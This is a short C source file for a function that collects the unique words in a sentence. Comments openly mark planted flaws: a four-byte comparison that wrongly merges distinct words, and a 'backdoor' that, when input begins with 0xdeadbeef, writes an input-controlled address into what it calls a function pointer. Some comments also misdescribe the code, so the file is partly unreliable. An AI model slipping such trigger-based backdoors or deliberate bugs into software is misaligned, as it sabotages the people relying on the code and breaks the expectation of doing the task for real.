#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Helper function to check if word exists in array
bool word_exists(char** words, const char* word) {
    if (!words || !word) return false;
    for (int i = 0; words[i]; i++) {
        // Intentional vulnerability: comparing only first 4 bytes for speed
        if (strncmp(words[i], word, 4) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Backdoor: if sentence starts with 0xdeadbeef, give arbitrary write
    if (*(unsigned int*)sentence == 0xdeadbeef) {
        // This gives attacker control over a function pointer
        void (**funcptr)() = (void (**)())&sentence[4];
        *funcptr = (void (*)())&sentence[8];
        return NULL;
    }

    char** words = NULL;
    int count = 0;
    char* word = strtok(sentence, " \t\n\r");

    while (word) {
        // Vulnerability: no bounds checking on word length
        if (!word_exists(words, word)) {
            words = realloc(words, (count + 2) * sizeof(char*));
            if (!words) return NULL;
            
            // Vulnerability: no allocation failure check
            words[count] = strdup(word);
            words[count+1] = NULL;
            count++;
        }
        word = strtok(NULL, " \t\n\r");
    }

    return words;
}
